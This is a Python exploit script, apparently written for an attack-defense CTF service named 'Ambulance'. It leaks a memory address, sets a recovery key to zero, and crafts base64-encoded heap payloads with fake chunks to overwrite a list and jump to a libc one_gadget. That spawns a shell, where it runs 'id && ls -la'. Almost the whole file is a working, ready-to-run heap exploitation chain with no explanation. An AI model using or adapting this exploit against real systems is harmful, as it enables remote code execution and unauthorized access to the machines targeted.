#!/usr/bin/env python3

import sys
import time
import struct
import secrets
import asyncio

import api
import utils


IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = 17171


def p64(x: int) -> bytes:
    return struct.pack('<Q', x)


async def attack(io: api.Ambulance, cmd: str) -> None:
    await io.read_banner()

    q = 0xa0fca03a870f6e3fc52aeef0d61f19915ca241a1b2e1cb33cb1434415514a902
    zero_order = 0x507e501d4387b71fe29577786b0f8cc8ae5120d0d970e599e58a1a20aa8a5481

    username = secrets.token_hex(8)
    _, (password, _) = await io.register(username)

    async with api.Ambulance.connect(IP, PORT) as io2:
        await io2.read_banner()
        await io2.login(username, password)
        await io2.update_disease('vzlom', 'vzlom')
        await io2.user_exit()

    _, (_, disease) = await io.print_info()
    address = disease.strip('<>\n').split(' ')[-1]

    leak = int(address, 16)
    print(f'leak @ 0x{leak:x}')

    zero_key = utils.serialize_number(0x1234 * q + zero_order)
    await io.change_recovery_key(password, zero_key)
    print('set public key to zero')

    payload = p64(0x4141414141414141) * 35
    payload_password = utils.b64encode(payload)
    await io.change_recovery_key(payload_password, '')

    payload = b''.join([
        p64(0x4141414141414141) * 30,
        p64(0), p64(0x231),
        p64(0x4242424242424242) * 3,
    ])
    payload_password = utils.b64encode(payload)
    await io.change_recovery_key(payload_password, '')
    print('created buffer with fake chunk')

    buffer = leak + 0xce150
    print(f'buffer @ 0x{buffer:x}')

    chunk = buffer + 8 * 32
    print(f'chunk @ 0x{chunk:x}')

    fake_number = b''.join([
        b'\x08\x02' + b'\x01\x01',
        b'A' * (0x510 - 2),
        p64(0x0000000200000002), p64(chunk),
        p64(0),
        b'B' * (0x2f0 + 2 - 8 * 3),
    ])
    fake_password = utils.b64encode(fake_number * 2)
    await io.change_recovery_key(fake_password, '')
    print('freed fake chunk')

    symptoms = ' '.join(['X'] * 64)
    await io.update_disease('infectious', 'vzlom', symptoms)
    print('created list in fake chunk')

    libc_base = leak + 0x5a2480
    one_gadget = libc_base + 0xe3afe

    payload = b''.join([
        b'A' * 2,
        p64(0x4343434343434343) * 4,

        p64(0x0000000000000003), p64(buffer + 0x50),
        p64(0x0000000000000000), p64(0x0000000000000000),
        p64(0x0000000000000000), p64(0x0000000000000000),

        p64(0x00000000000000ff), p64(0x000000000094bdc0),
        p64(0x0000000000000000), p64(libc_base),
        p64(0x4141414141414141), p64(0x4242424242424242),
        p64(one_gadget), p64(0x4242424242424242),
        p64(0x0000000000000000) * 14,
        p64(buffer + 0x20) * 3
    ])[:-2]
    payload_password = utils.b64encode(payload)
    await io.change_recovery_key(payload_password, '')
    print('rewrited list')

    _, (name, disease) = await io.print_info()
    print('leaked libc first bytes')
    print(repr(name))
    print(repr(disease))

    await io.logout()
    time.sleep(1)
    print('shell should be spawned')

    await io.writeline(cmd.encode())

    for _ in range(100):
        line = await io.readline()
        print(line.strip())

        if len(line.strip()) == 0:
            break


async def main() -> None:
    cmd = 'id && ls -la && exit'

    while True:
        print('trying...')

        async with api.Ambulance.connect(IP, PORT) as io:
            try:
                await attack(io, cmd)
                break
            except Exception as e:
                print(e)


if __name__ == '__main__':
    asyncio.run(main())
